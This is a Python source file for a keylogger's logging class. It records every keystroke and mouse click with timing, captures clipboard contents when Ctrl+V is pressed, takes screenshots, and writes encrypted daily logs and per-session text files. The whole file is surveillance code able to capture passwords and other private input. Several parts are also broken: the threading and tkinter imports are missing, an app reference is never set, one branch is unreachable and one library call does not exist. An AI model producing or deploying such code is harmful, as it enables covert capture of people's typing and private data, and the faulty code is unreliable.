from pynput import keyboard, mouse
import os
import time
import datetime
import pyperclip
from PIL import ImageGrab
import pyautogui
import platform
from tkinter import messagebox

class Logger:
    def __init__(self, settings):
        self.settings = settings
        self.keys = []
        self.current_session_keys = []
        self.current_session_folder = None
        self.session_stats = {"keys_pressed": 0, "most_used": {}, "start_time": None}
        self.last_key_time = None
        self.is_logging = False
        self.is_paused = False
        self.log_thread = None
        self.mouse_listener = None

    def start_logging(self):
        self.session_stats = {"keys_pressed": 0, "most_used": {}, "start_time": datetime.datetime.now()}
        self.is_logging = True
        self.log_thread = threading.Thread(target=self.log_keys, daemon=True)
        self.log_thread.start()
        self.mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
        self.mouse_listener.start()

    def stop_logging(self):
        self.is_logging = False
        self.is_paused = False
        self.save_log()
        self.save_session_summary()
        self.keys = []
        self.current_session_keys = []
        if self.current_session_folder and os.path.exists(self.current_session_folder):
            self.save_session_content()
        if self.mouse_listener:
            self.mouse_listener.stop()

    def log_keys(self):
        def on_press(key):
            if not self.is_logging or self.is_paused:
                return
            try:
                timestamp = datetime.datetime.now()
                time_str = timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                interval = 0.0 if self.last_key_time is None else (timestamp - self.last_key_time).total_seconds()
                self.last_key_time = timestamp
                key_str = self.process_key(key)
                if key_str:
                    log_entry = f"[{time_str}]  {key_str} ({interval:.0f}s)"
                    self.keys.append(log_entry)
                    self.current_session_keys.append(key_str if key_str not in ["[ENTER]", "[SCREENSHOT]"] else "")
                    self.update_preview(log_entry)
                    self.session_stats["keys_pressed"] += 1
                    self.session_stats["most_used"][key_str] = self.session_stats["most_used"].get(key_str, 0) + 1
                    if key_str == "[ENTER]":
                        self.create_new_session_folder()
                        self.save_session_content()
                        self.current_session_keys = []
                    elif key_str in ["[ENTER]", "[CTRL+V]"]:
                        self.take_screenshot()
            except Exception as e:
                self.keys.append(f"[{time_str}] Error: {str(e)}")

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def on_mouse_click(self, x, y, button, pressed):
        if not self.is_logging or self.is_paused or not pressed:
            return
        timestamp = datetime.datetime.now()
        time_str = timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        interval = 0.0 if self.last_key_time is None else (timestamp - self.last_key_time).total_seconds()
        self.last_key_time = timestamp
        button_str = "Left" if button == mouse.Button.left else "Right"
        log_entry = f"[{time_str}]  [MOUSE_{button_str}] ({interval:.0f}s)"
        self.keys.append(log_entry)
        self.update_preview(log_entry)
        self.session_stats["keys_pressed"] += 1
        self.session_stats["most_used"][f"[MOUSE_{button_str}]"] = self.session_stats["most_used"].get(f"[MOUSE_{button_str}]", 0) + 1

    def process_key(self, key):
        try:
            if hasattr(key, "char") and key.char:
                return key.char
            else:
                key_str = str(key).replace("Key.", "").upper()
                if key_str == "SPACE":
                    return "[SPACE]"
                elif key_str == "ENTER":
                    return "[ENTER]"
                elif key_str == "BACKSPACE":
                    return "[BACKSPACE]"
                elif key_str == "TAB":
                    return "[TAB]"
                elif key_str in ["CTRL_L", "CTRL_R"]:
                    if key_str == "CTRL_L" and keyboard.Controller().pressed(keyboard.KeyCode.from_vk(86)):
                        clipboard = pyperclip.paste()
                        return f"[CTRL+V] Clipboard: {clipboard}"
                    return f"[{key_str}]"
                elif key_str in ["SHIFT", "SHIFT_R", "ALT", "ALT_R", "CMD", "CMD_R"]:
                    return f"[{key_str}]"
                return f"[{key_str}]"
        except:
            return None

    def update_preview(self, log_entry):
        # This will be called by GUI, so we pass it to the GUI instance
        self.app.gui.update_preview(log_entry)

    def create_new_session_folder(self):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.current_session_folder = os.path.join(self.settings.config["log_folder"], f"session_{timestamp}.keylog")
        os.makedirs(self.current_session_folder, exist_ok=True)

    def save_session_content(self):
        if self.current_session_folder and self.current_session_keys:
            content_file = os.path.join(self.current_session_folder, "content.txt")
            sentence = " ".join(self.current_session_keys)
            try:
                with open(content_file, "a") as f:
                    f.write(sentence + "\n")
                time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                self.keys.append(f"[{time_str}]  [SESSION SAVED] (0s) [SAVED]")
                self.update_preview(self.keys[-1])
            except Exception as e:
                time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                self.keys.append(f"[{time_str}] Error: {str(e)}")

    def take_screenshot(self):
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            screenshot_path = os.path.join(self.settings.config["screenshot_folder"], f"screenshot_{timestamp}.png")
            if platform.system() == "Linux":
                pyautogui.screenshot().save(screenshot_path)
            else:
                ImageGrab.grab().save(screenshot_path)
            time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            log_entry = f"[{time_str}]  [SCREENSHOT] (0s) [SAVED]"
            self.keys.append(log_entry)
            self.update_preview(log_entry)
        except Exception as e:
            time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            self.keys.append(f"[{time_str}] Error: {str(e)}")

    def save_log(self):
        if not self.keys:
            return
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        log_file = os.path.join(self.settings.config["log_folder"], f"log_{date}.txt")
        log_content = "\n".join(self.keys)
        try:
            encrypted_content = self.app.encryption.cipher.encrypt(log_content.encode())
            with open(log_file, "wb") as f:
                f.write(encrypted_content)
            time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            self.keys.append(f"[{time_str}]  [LOG SAVED] (0s) [SAVED]")
            self.update_preview(self.keys[-1])
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save log: {str(e)}")

    def auto_save_logs(self):
        while self.is_logging:
            self.save_log()
            try:
                self.log_interval = int(self.app.gui.log_interval_entry.get())
            except ValueError:
                self.log_interval = 30
            time.sleep(self.log_interval)

    def save_session_summary(self):
        if not self.session_stats["start_time"]:
            return
        end_time = datetime.datetime.now()
        duration = (end_time - self.session_stats["start_time"]).total_seconds() / 60.0
        most_used = sorted(self.session_stats["most_used"].items(), key=lambda x: x[1], reverse=True)[:5]
        summary = [
            f"Session Summary - {end_time.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Total Duration: {duration:.2f} minutes",
            f"Total Keys Pressed: {self.session_stats['keys_pressed']}",
            "Top 5 Most Used Keys:",
            *[f"  {k}: {v} times" for k, v in most_used],
            f"Network Status: {self.app.get_network_status()}",
            f"Session Start: {self.session_stats['start_time'].strftime('%Y-%m-%d %H:%M:%S')}",
            f"Session End: {end_time.strftime('%Y-%m-%d %H:%M:%S')}"
        ]
        summary_file = os.path.join(self.settings.config["log_folder"], f"summary_{end_time.strftime('%Y-%m-%d')}.txt")
        try:
            with open(summary_file, "w") as f:
                f.write("\n".join(summary))
            time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            self.keys.append(f"[{time_str}]  [SUMMARY SAVED] (0s) [SAVED]")
            self.update_preview(self.keys[-1])
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save summary: {str(e)}")

    def search_logs(self):
        query = self.app.gui.search_entry.get().lower()
        if not query:
            messagebox.showinfo("Info", "Please enter a search query.")
            return
        self.app.gui.preview_text.configure(state="normal")
        self.app.gui.preview_text.delete(1.0, tk.END)
        found = False
        for log in self.keys:
            if query in log.lower():
                self.app.gui.preview_text.insert(tk.END, f"{log}\n")
                found = True
        if not found:
            self.app.gui.preview_text.insert(tk.END, "No matches found.\n")
        self.app.gui.preview_text.configure(state="disabled")

    def delete_old_logs(self):
        for file in os.listdir(self.settings.config["log_folder"]):
            if file.endswith(".txt") and datetime.datetime.now() - datetime.datetime.fromtimestamp(os.path.getctime(os.path.join(self.settings.config["log_folder"], file))) > datetime.timedelta(days=7):
                os.remove(os.path.join(self.settings.config["log_folder"], file))